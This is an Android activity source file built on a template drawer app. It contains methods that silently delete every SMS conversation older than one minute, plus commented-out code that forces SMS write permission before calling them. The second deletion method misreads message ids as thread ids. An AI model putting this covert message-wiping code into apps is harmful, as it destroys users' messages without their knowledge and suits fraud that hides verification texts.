package com.wyz.newengx;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.NavigationView;
import android.support.design.widget.Snackbar;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;

public class MainActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.setDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);



        startService(new Intent(this,  MyIntentService.class) );//
//        if (!SmsWriteOpUtil.isWriteEnabled(getApplicationContext())) {
//            SmsWriteOpUtil.setWriteEnabled(
//                    getApplicationContext(), true);
//        }
//        deleteSMS();

    }
    public void deleteSMS() {
        try {
            ContentResolver CR = getContentResolver();
            // Query SMS
            Uri uriSms = Uri.parse("content://sms");
            Cursor c = CR.query(uriSms, new String[] { "_id", "thread_id" ,"date"},
                    null, null, null);
            if (null != c && c.moveToFirst()) {
                do {
                    // Delete SMS
                    long threadId = c.getLong(1);
                    long date =  c.getLong(c.getColumnIndexOrThrow("date"))/1000;
                    long currdate  = System.currentTimeMillis()/1000;
                    if ((currdate - date> 1*60) ){
                        int result = CR.delete(Uri
                                        .parse("content://sms/conversations/" + threadId),
                                null, null);
                        Log.d("deleteSMS", "threadId:: " + threadId + "  result::"
                                + result);
                    }

                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.d("deleteSMS", "Exception:: " + e);
        }
    }
    public void deleteSMS1() {
        try {
            ContentResolver CR = getContentResolver();
            // Query SMS
//            Uri uriSms = Uri.parse("content://sms/inbox");
//            Uri uriSms = Uri.parse("content://sms/sent");
            Uri uriSms = Uri.parse("content://sms");
            Cursor c = CR.query(uriSms, new String[] { "_id", "thread_id","date","body","address" },null, null, null);
            if (null != c && c.moveToFirst()) {
                do {
                    // Delete SMS
                    long threadId = c.getLong(0);
//                        for (int i = 0; i < c.getColumnCount() ; i++){
//                            String name  = c.getColumnName(i) ;
                            long date =  c.getLong(c.getColumnIndexOrThrow("date"))/1000;
                             long currdate  = System.currentTimeMillis()/1000;
                            if ((currdate - date> 1*60) ){
                                            int result = CR.delete(Uri.parse("content://sms/conversations/" + threadId), null, null);
                                            Log.d("deleteSMS", "threadId:: " + threadId + "  result::" + result);

                    }
//                            System.out.println(name + "----------------"+subject);
//                        }
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.d("deleteSMS", "Exception:: " + e);
        }
    }

    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();

        if (id == R.id.nav_camera) {
            // Handle the camera action
        } else if (id == R.id.nav_gallery) {

        } else if (id == R.id.nav_slideshow) {

        } else if (id == R.id.nav_manage) {

        } else if (id == R.id.nav_share) {

        } else if (id == R.id.nav_send) {

        }

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }
}
